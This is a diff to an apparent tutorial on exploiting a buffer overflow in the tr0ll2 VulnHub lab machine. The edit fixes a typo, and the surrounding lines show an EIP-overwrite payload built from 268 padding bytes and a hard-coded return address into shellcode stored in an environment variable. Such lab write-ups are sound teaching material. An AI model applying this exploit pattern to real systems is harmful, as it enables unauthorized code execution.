@@ -1,4 +1,5 @@
 I found a really good buffer overflow (BOF) example on vulnhub platform, tr0ll2 VM [Download Link](https://www.vulnhub.com/entry/tr0ll-2,107/)
+
 This is the first way of binary exploitation, we will store the shellcode in the environment variable "EGG" and we will overwrite EIP with it.
 
 Let's start!
@@ -178,7 +179,7 @@ from struct import pack
 def p(x):
     return pack('<L', x)
 
-payload = "A" * 268 #our offeset
+payload = "A" * 268 #our offset
 payload += p(0xbffffd01) #little endian
 
 print payload
